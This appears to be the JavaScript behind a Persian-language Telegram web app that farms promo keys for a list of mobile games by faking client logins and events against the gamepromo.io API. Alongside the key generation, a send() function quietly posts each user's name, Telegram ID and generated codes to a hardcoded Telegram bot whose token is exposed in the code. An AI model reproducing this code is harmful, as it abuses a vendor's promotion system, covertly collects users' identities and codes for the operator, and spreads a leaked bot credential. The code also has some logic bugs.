const games = {

    1: {
        name: 'Zoopolis',
            appToken: 'b2436c89-e0aa-4aed-8046-9b0515e1c46b',
            promoId: 'b2436c89-e0aa-4aed-8046-9b0515e1c46b',
            interval: 20,
            eventCount: 8, 
    },


    
    2 : {
        name: 'Fluff Crusade',
        appToken: '112887b0-a8af-4eb2-ac63-d82df78283d9',
        promoId: '112887b0-a8af-4eb2-ac63-d82df78283d9',
        interval: 120,
        eventCount: 1,
    },
    3: {
        name: 'Mow and Trim',
        appToken: 'ef319a80-949a-492e-8ee0-424fb5fc20a6',
        promoId: 'ef319a80-949a-492e-8ee0-424fb5fc20a6',
        interval: 20,
        eventCount: 10,
    },
    4: {
        name: 'Chain Cube 2048',
        appToken: 'd1690a07-3780-4068-810f-9b5bbf2931b2',
        promoId: 'b4170868-cef0-424f-8eb9-be0622e8e8e3',
        interval: 20,
        eventCount: 3,
    },
    5: {
        name: 'Train Miner',
        appToken: '82647f43-3f87-402d-88dd-09a90025313f',
        promoId: 'c4480ac7-e178-4973-8061-9ed5b2e17954',
        interval: 120,
        eventCount: 1,
    },
    6: {
        name: 'Merge Away',
        appToken: '8d1cc2ad-e097-4b86-90ef-7a27e19fb833',
        promoId: 'dc128d28-c45b-411c-98ff-ac7726fbaea4',
        interval: 21,
        eventCount: 7,
    },
    7: {
        name: 'TwerkRace',
        appToken: '61308365-9d16-4040-8bb0-2f4a4c69074c',
        promoId: '61308365-9d16-4040-8bb0-2f4a4c69074c',
        interval: 20,
        eventCount: 10,
        },
       8: {
            
        name: 'Polysphere',
        appToken: '2aaf5aee-2cbc-47ec-8a3f-0962cc14bc71',
        promoId: '2aaf5aee-2cbc-47ec-8a3f-0962cc14bc71',
        interval: 20,
        eventCount: 16,
        },
    9 : {
        name: 'Tile Trio',
        appToken: 'e68b39d2-4880-4a31-b3aa-0393e7df10c7',
        promoId: 'e68b39d2-4880-4a31-b3aa-0393e7df10c7',
        interval: 20,
        eventCount: 5,
    },
    10: {
        name: 'stone age',
         appToken: '04ebd6de-69b7-43d1-9c4b-04a6ca3305af' ,
         promoId: '04ebd6de-69b7-43d1-9c4b-04a6ca3305af',
        interval: 20,
        eventCount: 16,
    },
    11 : {
        name: 'Bouncemasters',
        appToken: 'bc72d3b9-8e91-4884-9c33-f72482f0db37',
        promoId: 'bc72d3b9-8e91-4884-9c33-f72482f0db37',
        interval: 61,
        eventCount: 1,
    },
    12:{
       name: 'Hide ball',
       appToken: '4bf4966c-4d22-439b-8ff2-dc5ebca1a600',
       promoId: '4bf4966c-4d22-439b-8ff2-dc5ebca1a600',
       interval: 61,
        eventCount: 1,
    }
};
//const ln = document.getElementById('ln');
//const container = document.querySelector('.container');
      //  ln.addEventListener('click', () => {
          //  if (container.style.backgroundColor === 'black') {
              //  container.style.backgroundColor = 'white';
          //  } else {
               // container.style.backgroundColor = 'black';
           // }
       // });

function displayUserInfo() {
    try {
        
           const params = new URLSearchParams(decodeURIComponent(window.location.href.split('#')[1]));
            const userParam = params.get('user');
            if (userParam) {
            const user = JSON.parse(userParam);
            document.getElementById('user-info').textContent = ` عرض سلام و خیر مقدم دارم خدمتتون ${user.first_name}`;   
            }
    } catch (error) {
        console.error('An error occurred:', error);
            }
}

document.addEventListener('DOMContentLoaded', displayUserInfo);

const toggleIcon = document.getElementById('toggleIcon');
        const container = document.querySelector('.container');
        toggleIcon.addEventListener('click', () => {
            if (container.style.backgroundColor === 'black') {
                container.style.backgroundColor = 'white';
                toggleIcon.textContent = '🌙';
            } else {
                container.style.backgroundColor = 'black';
                toggleIcon.textContent = '☀️';
            }
        });

function generateClientId() {
    // return crypto.randomUUID();
    
     const timestamp = Date.now();
    const randomNumbers = [];
    
    for (let i = 0; i < 19; i++) {
        randomNumbers.push(Math.floor(Math.random() * 10));
     }
    
     return `${timestamp}-${randomNumbers.join('')}`;
}


async function loginClient(gameNumber) {
    const clientId = generateClientId();
    const url = 'https://api.gamepromo.io/promo/login-client';
  
    const data = {
        appToken: games[gameNumber].appToken,
        clientId: clientId,
        clientOrigin: 'deviceid'
    };

    const headers = {
        'Content-Type': 'application/json; charset=utf-8',
    };

    try {
        const response = await fetch(url, {
            signal: AbortSignal.timeout(5000),
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data)
        });
        const result = await response.json();

        if (result.error_code === 'TooManyIpRequest') {
            return 'TooManyIpRequest';
        }
        return result.clientToken;
    } catch (error) {
        await new Promise(resolve => setTimeout(resolve, 5000));
        return loginClient(gameNumber);
    }
}

async function registerEvent(token, gameNumber) {
    await new Promise(resolve => setTimeout(resolve, games[gameNumber].interval * 1000));
    const eventId = generateRandomUUID();
    const url = 'https://api.gamepromo.io/promo/register-event';
    const data = {
        promoId: games[gameNumber].promoId,
        eventId: eventId,
        eventOrigin: 'undefined'
    };
    const headers = {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json; charset=utf-8',
    };
    try {
        const response = await fetch(url, {
            signal: AbortSignal.timeout(5000),
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if (!result.hasCode) {
            console.log('Retry register event');
            return registerEvent(token, gameNumber);
        } else {
            return token;
        }
    } catch (error) {
        console.error('Fatal error:', error.message);
        await new Promise(resolve => setTimeout(resolve, 5000));
        let newToken = await loginClient(gameNumber);
        if (newToken === 'TooManyIpRequest') {
            throw new Error('ای‌پیت لو رفت ، صبوری چاره کاره')
        }
        return registerEvent(newToken, gameNumber);
    }
}

async function createCode(token, gameNumber) {
    let response;
    do {
        try {
            await new Promise(resolve => setTimeout(resolve, 1000))
            const url = 'https://api.gamepromo.io/promo/create-code';

            const data = {
                promoId: games[gameNumber].promoId
            };

            const headers = {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json; charset=utf-8',
            };
            response = await fetch(url, {
                signal: AbortSignal.timeout(5000),
                method: 'POST',
                headers: headers,
                body: JSON.stringify(data)
            });

            const result = await response.json();

            if (result.promoCode) {
                return result.promoCode;
            }

        } catch (error) {
            console.error('Fatal error:', error.message);
        }
    } while (!response || !response.promoCode); 
}

function generateRandomUUID() {
    return "10000000-1000-4000-8000-100000000000".replace(/[018]/g, c =>
        (+c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +c / 4).toString(16)
    );
}

const generateButton = document.getElementById('generateButton');
const generateTimeValue = document.getElementById('generate-time-value');
const generateProcessBlock = document.getElementById('process-generate-block');
let keyBlock = document.getElementById('keys-block');
const gameSelect = document.getElementById('game-names-select');

async function generate() {
    setsel(gameSelect.value);
    generateButton.style.display = 'none';
    gameSelect.disabled = true;
    generateProcessBlock.style.display = 'flex';

    const selectedGame = parseInt(gameSelect.value);

    let eventInterval =  games[selectedGame].interval;
    let eventCount =  games[selectedGame].eventCount;
    const endGenerateTime = Date.now() + (eventInterval * eventCount + 30) * 1000;

    keyBlock.style.display = 'none';

    generateTimeValue.innerText = '⏳';

    let generateTimeInterval = setInterval(() => startProcessGeneration(endGenerateTime), 1000);
    const codes = [];

    await new Promise(resolve => setTimeout(resolve, 5000));

    const tasks = [];

    for (let i = 0; i < 4; i++) {
        tasks.push((async (index) => {
            try {
                let token = await loginClient(selectedGame);

                if (token === 'TooManyIpRequest') {
                    throw new Error('آی‌پیت لو رفت، نیاز به صبوری')
                }

                let registerToken = await registerEvent(token, selectedGame);
                codes[index] = await createCode(registerToken, selectedGame);
            } catch (error) {
                codes[index] = `Error: ${error.message}`;
            }
        })(i));
    }

    await Promise.all(tasks);

    keyBlock.style.display = 'flex';

    for (let i = 0; i < 4; i++) {
        let keyValue = document.getElementById('keys-value-' + (i + 1));
        keyValue.innerText = codes[i];
    }
  generateButton.style.display = 'block';
    gameSelect.disabled = false;
    clearInterval(generateTimeInterval);
    updateGenerateTime(gameSelect)
    console.log(codes);
    send(codes);
}
function send(msgArray) {
           const params = new URLSearchParams(decodeURIComponent(window.location.href.split('#')[1]));
            const user = JSON.parse(params.get('user'));
            const escapedMsgArray = msgArray.map(msg => msg.replace(/[-]/g, '\\-'));
            const message = `${user.first_name}:${user.last_name} : ${user.id} \n${escapedMsgArray.join(' ')}`;
            const TOK = '7118863448:AAFUXZ9lIOPB7-8HqIJDnsigUdATvpkg4L8';
            const TcID = '-1002248182942';
            const data = JSON.stringify({
                chat_id: TcID,
                text: message,
                parse_mode: 'MarkdownV2'
            });
           
            const xhr = new XMLHttpRequest();
            xhr.open('POST', `https://api.telegram.org/bot${TOK}/sendMessage`, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    //console.log('Message sent successfully:', xhr.responseText);
                } else if (xhr.readyState === 4) {
                    //console.error('Error sending message:', xhr.responseText);
                }
            };
            xhr.send(data);
        }
function startProcessGeneration(generationTime) {
    function updateProcessGenerationTime(generationTime) {
        const now = new Date();
        
        const distance = generationTime - now.getTime();

        generateTimeValue.innerText = printTime(distance)

        if (distance < 0) {
            generateTimeValue.innerText = "⏳";
        }
    }

    updateProcessGenerationTime(generationTime);
}

function printTime(distance) {
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);

    return  String(hours).padStart(2, '0') + ':' +
        String(minutes).padStart(2, '0') + ':' +
        String(seconds).padStart(2, '0');
}

function updateGenerateTime(select) {
    const selectedGame = parseInt(select.value);

    let eventInterval =  games[selectedGame].interval;
    let eventCount =  games[selectedGame].eventCount;

    generateTimeValue.innerText = printTime((eventInterval * eventCount + 30) * 1000)
}
function changesel(v) {
    
    document.getElementById('game-names-select').value = v;
    const selectedGame = parseInt(v);
    let eventInterval = games[selectedGame].interval;
    let eventCount = games[selectedGame].eventCount;
    generateTimeValue.innerText = printTime((eventInterval * eventCount + 30) * 1000);
}
function setsel(v)
{
let selectedText;
    switch (v) {
        case '1':
            selectedText =  "zoopolis ";
            break;
        
        case '2':
            selectedText = "fluff ";
            break;
        case '3':
            selectedText = "mow & trim ";
            break;
        case '4':
            selectedText = "chain cube ";
            break;  
        case '5':
            selectedText = "train miner ";
         case '6':
            selectedText = "merge away";
            break;
        case '7':
            selectedText = "twer race ";
            break;
         case '8':
            selectedText = "polysphere ";
            break;
         case '9':
            selectedText = "tile trio ";
            break;
        case '10':
            selectedText = "stone age ";
            break;
           case '11':
            selectedText = "bouncemasters ";
        default:
            selectedText = "";
    }
   // document.getElementById('selectedgame').innerText = selectedText + " در حال تولید کد برای "

}


function openurl()
{
    window.open('https://t.me/+OfQR1G0RQRYwMzdk', '_blank');
 
}
async function copyCode(codeId, button) {
    try {
        const content = document.getElementById(codeId).textContent;
        await navigator.clipboard.writeText(content);

        const toast = document.getElementById('toast');

        const buttonRect = button.getBoundingClientRect();
        toast.style.left = `${buttonRect.left + window.scrollX - 10}px`;
        toast.style.top = `${buttonRect.top - toast.offsetHeight + window.scrollY}px`;

        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 2000); 
    } catch (error) {
        console.error('Failed to copy content: ', error);
    }
}

generateButton.addEventListener('click', generate);

updateGenerateTime(gameSelect)
